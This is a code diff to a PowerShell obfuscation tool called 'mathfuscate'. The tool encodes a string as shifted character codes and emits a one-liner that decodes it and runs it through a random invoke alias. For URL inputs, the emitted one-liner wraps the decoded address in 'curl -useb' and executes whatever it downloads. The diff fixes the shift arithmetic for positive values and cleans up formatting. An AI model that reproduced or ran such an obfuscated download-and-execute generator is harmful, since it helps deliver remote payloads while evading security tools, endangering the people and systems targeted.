@@ -40,6 +40,7 @@ Do{
     $char = $charCom -join ","
 
     # Aquire number to add or subtract
+    
     Try{ 
         $shift = Read-Host -Prompt "`n`nWhat number shoud be added or subtracted?" -ErrorAction stop
     } 
@@ -54,6 +55,7 @@ Do{
     # Handle positive/negative
     if ($shift -gt 0) {
         $operator = "-"
+        $pos = $shift
     } elseif ($shift -lt 0) {
         $operator = "+"
         $pos = [Math]::Abs($shift)
@@ -77,7 +79,7 @@ Do{
     function CalcPayload() {
         $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
         if($tochar -clike 'http*') {
-            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_" + $operator + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
+            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_" + $operator + $pos + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
         } else {
             Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_" + $operator + $pos + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
         }
@@ -89,12 +91,13 @@ Do{
     Do{
         $restart = Read-host "Do you want to mathfuscate another? (Y/N)"
         If(($restart -eq "Y") -or ($restart -eq "N")){
-            $ver = $true}
+            $ver = $true
+        }
         Else{
-            write-host -fg Red "Invalid input. (Y/N)?"
+            Write-Host -ForegroundColor Red "Invalid input. (Y/N)?"
         }
     }Until($ver)
 
 }Until($restart -eq "N")
 
-Write-Host -fg Green "Bye!"
+Write-Host "Bye!" -ForegroundColor Green
